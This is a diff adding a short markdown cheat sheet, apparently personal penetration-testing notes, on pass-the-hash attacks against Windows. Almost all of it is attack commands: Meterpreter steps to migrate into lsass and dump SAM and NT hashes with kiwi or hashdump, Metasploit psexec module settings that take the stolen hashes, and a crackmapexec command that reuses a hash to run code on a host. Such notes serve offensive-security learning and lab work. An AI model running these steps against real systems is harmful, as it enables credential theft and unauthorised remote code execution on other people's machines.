@@ -1,0 +1,34 @@
+### Pass The Hash
+
+---
+
+##### Initial access with low priviliges
+
+> - pgrep lsass
+> - migrate 788
+> - load kiwi
+>   
+>   > - lsa_dump_sam
+>   >   
+>   >   or 
+> - hashdump // this one will give us the LM Hash (The same for All users) and NT Hash (specific to every user)
+
+*save the users hash*
+
+---
+
+##### Use Psexec module to pass the hash
+
+> - use exploit/windows/smb/psexec
+> - set LPORT
+> - set RHOSTS
+> - set SMBUSER
+> - set payload <...>
+> - set SMBPASS < Use the LM and NT Hashes separed with ':' Hashes you found in the previous section  >
+> - set target (sometimes, we need to change the target type, settings something like native\ upload)
+
+---
+
+##### Use crackmap to pass the hash
+
+> - crackmap smb 1.1.1.1 -u Administrateur - H "LM Hash" -x "ipconfig"
